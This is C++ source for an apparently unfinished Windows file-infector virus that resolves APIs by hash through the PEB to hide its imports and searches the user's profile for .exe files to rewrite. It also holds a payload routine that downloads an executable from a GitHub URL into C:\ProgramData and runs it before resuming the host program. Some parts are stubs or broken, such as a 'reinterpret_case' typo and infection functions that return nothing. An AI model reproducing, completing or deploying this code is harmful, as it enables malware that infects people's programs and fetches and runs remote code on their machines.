#include <cstdint>
#include <iostream>
#include <string>

#include <windows.h>
#include <winternl.h>
#include <shlobj.h>

typedef struct FULL_PEB_LDR_DATA
{
   ULONG Length;
   BOOLEAN Initialized;
   HANDLE SsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   PVOID EntryInProgress;
   BOOLEAN ShutdownInProgress;
   HANDLE ShutdownThreadId;
} FULL_PEB_LDR_DATA, *PFULL_PEB_LDR_DATA;

typedef struct FULL_LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;

typedef void * (* mallocHeader)(std::size_t);
typedef void * (* reallocHeader)(void *, std::size_t);
typedef void (* freeHeader)(void *);
typedef char * (* strncatHeader)(char *, const char *, std::size_t);
typedef int (* strnicmpHeader)(const char *, const char *, std::size_t);
typedef std::size_t (* strlenHeader)(const char *);
typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
typedef HANDLE (* CreateFileAHeader)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD (* GetFileSizeHeader)(HANDLE, LPDWORD);
typedef BOOL (* ReadFileHeader)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (* CloseHandleHeader)(HANDLE);
typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

struct InfectorIAT
{
   /* msvcrt */
   mallocHeader malloc;
   reallocHeader realloc;
   freeHeader free;
   strncatHeader strncat;
   strnicmpHeader strnicmp;
   strlenHeader strlen;
   memcpyHeader memcpy;

   /* kernel32 */
   LoadLibraryAHeader loadLibrary;
   FindFirstFileAHeader findFirstFile;
   FindNextFileAHeader findNextFile;
   CreateFileAHeader createFile;
   GetFileSizeHeader getFileSize;
   ReadFileHeader readFile;
   CloseHandleHeader closeHandle;

   /* shell32 */
   SHGetFolderPathAHeader getFolderPath;
};

std::uint32_t fnv321a(const char *string)
{
   std::uint32_t hashval = 0x811c9dc5;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x1000193;
   }

   return hashval;
}

LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
{
   const IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS *>(reinterpret_cast<const std::uint8_t *>(module)+module->e_lfanew);
   const IMAGE_EXPORT_DIRECTORY *export_directory = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(
      reinterpret_cast<const std::uint8_t *>(module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   const DWORD *name_pointers = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNames);
   const WORD *name_ordinals = reinterpret_cast<const WORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNameOrdinals);
   const DWORD *functions = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfFunctions);

   for (std::uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = reinterpret_cast<const char *>(reinterpret_cast<const std::uint8_t *>(module)+name_pointers[i]);

      if (fnv321a(name) != hash)
         continue;

      return reinterpret_cast<LPCVOID>(reinterpret_cast<const std::uint8_t *>(module)+functions[name_ordinals[i]]);
   }

   return nullptr;
}

PIMAGE_DOS_HEADER infect_32bit(PIMAGE_DOS_HEADER module)
{
   std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
   PIMAGE_NT_HEADERS32 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(byte_module+module->e_lfanew);

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
   {
      std::wcout << "\t\tExecutable does not have a TLS directory." << std::endl;
   }
   else
   {
      std::wcout << "\t\tExecutable has a TLS directory." << std::endl;
   }

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
      std::wcout << "\t\tExecutable has no relocations." << std::endl;
   else
      std::wcout << "\t\tExecutable has relocations." << std::endl;

   std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(byte_module+module->e_lfanew+nt_headers_size);

   return nullptr;
}

PIMAGE_DOS_HEADER infect_64bit(PIMAGE_DOS_HEADER module)
{
   std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
   PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(byte_module+module->e_lfanew);

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
   {
      std::wcout << "\t\tExecutable does not have a TLS directory." << std::endl;
   }
   else
   {
      std::wcout << "\t\tExecutable has a TLS directory." << std::endl;
   }

   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
      std::wcout << "\t\tExecutable has no relocations." << std::endl;
   else
      std::wcout << "\t\tExecutable has relocations." << std::endl;

   std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(byte_module+module->e_lfanew+nt_headers_size);

   return nullptr;
}

void load_infector_iat(InfectorIAT *iat)
{
   if (iat == nullptr)
      return;

#if defined(BROODSAC32)
   PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
#elif defined(BROODSAC64)
   PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
   PFULL_LDR_DATA_TABLE_ENTRY list_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(ldr->InLoadOrderModuleList.Flink);
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
   iat->loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
   iat->findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
   iat->findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
   std::cout << "CreateFileA: " << std::hex << fnv321a("CreateFileA") << std::endl;
   std::cout << "GetFileSize: " << std::hex << fnv321a("GetFileSize") << std::endl;
   std::cout << "ReadFile: " << std::hex << fnv321a("ReadFile") << std::endl;
   std::cout << "CloseHandle: " << std::hex << fnv321a("CloseHandle") << std::endl;
   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("msvcrt.dll"));
   iat->malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
   iat->realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
   iat->free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
   iat->strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
   iat->strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
   iat->strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
   iat->memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("shell32.dll"));
   iat->getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
}

int infect(void)
{
   InfectorIAT iat;
   load_infector_iat(&iat);

   return 0;
   
   char profile_directory[MAX_PATH+1];

   if (iat.getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
      return 2;

   char prepend_path[] = "\\\\?\\";
   std::size_t root_size = iat.strlen(prepend_path)+iat.strlen(profile_directory)+1;
   char *search_root = reinterpret_cast<char *>(iat.malloc(root_size));
   iat.memcpy(search_root, prepend_path, iat.strlen(prepend_path)+1);
   iat.strncat(search_root, profile_directory, iat.strlen(profile_directory));

   /* create a stack of directory names to traverse */
   std::size_t search_stack_size = 1;
   char **search_stack = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * search_stack_size));
   search_stack[0] = search_root;

   std::size_t found_executables_size = 0;
   char **found_executables = nullptr;

   while (search_stack_size > 0)
   {
      char *search_visit = search_stack[0];
      char starSearch[] = "\\*";
      char exeSearch[] = ".exe";
      --search_stack_size;

      if (search_stack_size == 0)
      {
         iat.free(search_stack);
         search_stack = nullptr;
      }
      else
      {
         iat.memcpy(&search_stack[0], &search_stack[1], sizeof(char *) * search_stack_size);
         search_stack = reinterpret_cast<char **>(iat.realloc(search_stack, sizeof(char *) * search_stack_size));
      }

      char *search_string = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(starSearch)+1));
      iat.memcpy(search_string, search_visit, iat.strlen(search_visit)+1);
      iat.strncat(search_string, starSearch, iat.strlen(starSearch));
      
      WIN32_FIND_DATAA find_data;
      HANDLE find_handle = iat.findFirstFile(search_string, &find_data);

      if (find_handle == INVALID_HANDLE_VALUE)
         goto free_and_continue;

      do
      {
         char slash[] = "\\";
         char dot[] = ".";
         char dotDot[] = "..";

         if (iat.strnicmp(find_data.cFileName, dot, 2) == 0 || iat.strnicmp(find_data.cFileName, dotDot, 3) == 0)
            continue;
         else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400) // if directory and not symlink
         {
            char *new_directory = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
            iat.memcpy(new_directory, search_visit, iat.strlen(search_visit)+1);
            iat.strncat(new_directory, slash, iat.strlen(slash));
            iat.strncat(new_directory, find_data.cFileName, iat.strlen(find_data.cFileName));

            ++search_stack_size;
            
            if (search_stack == nullptr)
               search_stack = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * search_stack_size));
            else
               search_stack = reinterpret_cast<char **>(iat.realloc(search_stack, sizeof(char *) * search_stack_size));
            
            search_stack[search_stack_size-1] = new_directory;
         }
         else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
         {
            char *found_executable = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
            iat.memcpy(found_executable, search_visit, iat.strlen(search_visit)+1);
            iat.strncat(found_executable, slash, iat.strlen(slash));
            iat.strncat(found_executable, find_data.cFileName, iat.strlen(find_data.cFileName));

            ++found_executables_size;
            
            if (found_executables == nullptr)
               found_executables = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * found_executables_size));
            else
               found_executables = reinterpret_cast<char **>(iat.realloc(found_executables, sizeof(char *) * found_executables_size));

            found_executables[found_executables_size-1] = found_executable;
         }
      } while (iat.findNextFile(find_handle, &find_data));

   free_and_continue:
      iat.free(search_string);
      iat.free(search_visit);
   }

   std::wcout << found_executables_size << " executables were found." << std::endl;

   for (std::size_t i=0; i<found_executables_size; ++i)
   {
      char *executable = found_executables[i];
      HANDLE exe_handle = iat.createFile(executable,
                                         GENERIC_READ,
                                         0,
                                         nullptr,
                                         OPEN_EXISTING,
                                         FILE_ATTRIBUTE_NORMAL,
                                         nullptr);

      if (exe_handle == INVALID_HANDLE_VALUE)
      {
         std::wcout << "\tFailed to open " << executable << std::endl;
         goto end_exe_loop;
      }

      DWORD file_size = iat.getFileSize(exe_handle, nullptr);

      if (file_size == INVALID_FILE_SIZE)
      {
         std::wcout << "\t" << executable << " is larger than 4gb" << std::endl;
         goto close_file;
      }

      std::uint8_t *exe_buffer = reinterpret_cast<std::uint8_t *>(iat.malloc(file_size));
      DWORD bytes_read = 0;

      if (!iat.readFile(exe_handle, exe_buffer, file_size, &bytes_read, nullptr))
      {
         std::wcout << "\tFailed to read " << executable << std::endl;
         goto free_file;
      }

      IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
      IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(exe_buffer+dos_header->e_lfanew);
      IMAGE_DOS_HEADER *rewritten_image;

      if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
      {
         std::wcout << "\t" << executable << " is 32-bit." << std::endl;
         rewritten_image = infect_32bit(iat, dos_header, file_size);
      }
      else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
      {
         std::wcout << "\t" << executable << " is 64-bit." << std::endl;
         rewritten_image = infect_64bit(iat, dos_header, file_size);
      }

      if (rewritten_image != nullptr)
      {
         iat.closeHandle(exe_handle);
         exe_handle = INVALID_HANDLE_VALUE;
      }

   free_file:
      iat.free(exe_buffer);
      exe_buffer = nullptr;

   close_file:
      if (exe_handle != INVALID_HANDLE_VALUE)
         iat.closeHandle(exe_handle);
      
   end_exe_loop:
      iat.free(found_executables[i]);
   }

   iat.free(found_executables);

   return 0;
}

void callback(void)
{
   return;
}

int callout(void)
{
   /* TODO pushad at the top of the function */
   
   void (* volatile entrypoint)() = callback;
#if defined(BROODSAC32)
   PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
#elif defined(BROODSAC64)
   PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
   PFULL_LDR_DATA_TABLE_ENTRY list_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(ldr->InLoadOrderModuleList.Flink);
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
   GetFileAttributesAHeader getFileAttributes = reinterpret_cast<GetFileAttributesAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xda1a7563));
   PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("urlmon.dll"));
   URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xd8d746fc));
   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("shell32.dll"));
   ShellExecuteAHeader shellExecute = reinterpret_cast<ShellExecuteAHeader>(get_proc_by_hash(shell32Module, 0xb0ff5bf));

   char sheep[] = "C:\\ProgramData\\sheep.exe";
   
   if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
   {
      if (urlDownloadToFile(nullptr,
                            "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
                            sheep,
                            0,
                            nullptr) != 0)
         goto resume_executable;
   }

   if (reinterpret_cast<INT_PTR>(shellExecute(nullptr, nullptr, sheep, nullptr, nullptr, 1)) <= 32)
      goto resume_executable;

   /* TODO popad */
resume_executable:
   entrypoint();
   return 0;
}

int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
   //infect();
   return infect();
}
